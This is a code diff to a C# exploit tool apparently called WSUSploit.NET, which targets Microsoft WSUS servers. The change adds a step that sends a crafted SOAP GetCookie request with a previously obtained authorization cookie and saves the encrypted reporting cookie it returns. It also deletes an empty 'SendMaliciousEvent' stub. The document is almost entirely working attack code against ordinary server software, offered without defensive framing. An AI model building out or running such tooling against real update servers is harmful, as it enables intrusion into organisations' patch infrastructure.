@@ -17,6 +17,9 @@ Console.WriteLine($"[*] Running against {serverUri}");
 WSUSServer server = new WSUSServer(serverUri);
 await server.GetServerId();
 await server.GetAuthCookie();
+await server.GetReportingCookie();
+
+
 
 namespace WSUSploit.NET
 {
@@ -26,7 +29,8 @@ namespace WSUSploit.NET
         public int Port { get; set; }
         public Uri URL { get; set; }
         public string AuthCookie { get; set; } = "";
-        public string ReportingCookie { get; set; } = "";
+        public record ReportingCookie(string EncryptedData, DateTime Expiration);
+        public ReportingCookie? reportingCookie { get; set; }
 
         private readonly HttpClient _httpClient;
 
@@ -107,7 +111,7 @@ namespace WSUSploit.NET
             content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie");
 
             var response = await _httpClient.PostAsync("/SimpleAuthWebService/SimpleAuth.asmx", content);
-            
+            response.EnsureSuccessStatusCode ();
             var responseBody = await response.Content.ReadAsStringAsync();
 
             // Parse the XML
@@ -132,14 +136,67 @@ namespace WSUSploit.NET
             this.AuthCookie = cookieData;
         }
 
-        string GetReportingCookie(string target, string authCookie)
+        public async Task GetReportingCookie()
         {
-            return "";
+            Console.WriteLine("[*] Fetching ReportingCookie...");
+
+            string timeNow = DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss'Z'");
+            var soapBody = $@"<?xml version=""1.0"" encoding=""utf-8""?>
+            <soap:Envelope xmlns:soap=""http://schemas.xmlsoap.org/soap/envelope/"">
+            <soap:Body>
+            <GetCookie xmlns=""http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService"">
+            <authCookies>
+            <AuthorizationCookie>
+            <PlugInId>SimpleTargeting</PlugInId>
+            <CookieData>{this.AuthCookie}</CookieData>
+            </AuthorizationCookie>
+            </authCookies>
+            <oldCookie xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" i:nil=""true""/>
+            <lastChange>{timeNow}</lastChange>
+            <currentTime>{timeNow}</currentTime>
+            <protocolVersion>1.20</protocolVersion>
+            </GetCookie>
+            </soap:Body>
+            </soap:Envelope>";
+
+            var content = new StringContent(soapBody, Encoding.UTF8, "text/xml");
+            content.Headers.Add("SOAPAction", "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie");
+
+            var response = await _httpClient.PostAsync("/ClientWebService/Client.asmx", content);
+            response.EnsureSuccessStatusCode();
+
+            var responseBody = await response.Content.ReadAsStringAsync();
+
+            // Parse the XML
+            XDocument xmlDoc = XDocument.Parse(responseBody);
+            XNamespace msNs = "http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService";
+
+            string? encryptedData = xmlDoc
+                .Descendants(msNs + "EncryptedData")
+                .FirstOrDefault()?.Value;
+
+            if (string.IsNullOrEmpty(encryptedData))
+            {
+                Console.WriteLine("[!] ERROR: EncryptedData not found! Exiting...");
+                Environment.Exit(1);
+            }
+
+            string? expiration = xmlDoc
+                .Descendants(msNs + "Expiration")
+                .FirstOrDefault()?.Value;
+
+            if (string.IsNullOrEmpty(expiration))
+            {
+                Console.WriteLine("[!] ERROR: Expiration not found! Exiting...");
+                Environment.Exit(1);
+            }
+
+            Console.WriteLine($"[*] GetCookieResult EncryptedData retrieved : (length: {encryptedData.Length})");
+            Console.WriteLine($"[*] GetCookieResult Expiration retrieved : {expiration}");
+
+            this.reportingCookie = new ReportingCookie(encryptedData, DateTime.Parse(expiration));
+
         }
 
-        void SendMaliciousEvent(string target, string cookie)
-        {
-
-        }
     }
 }
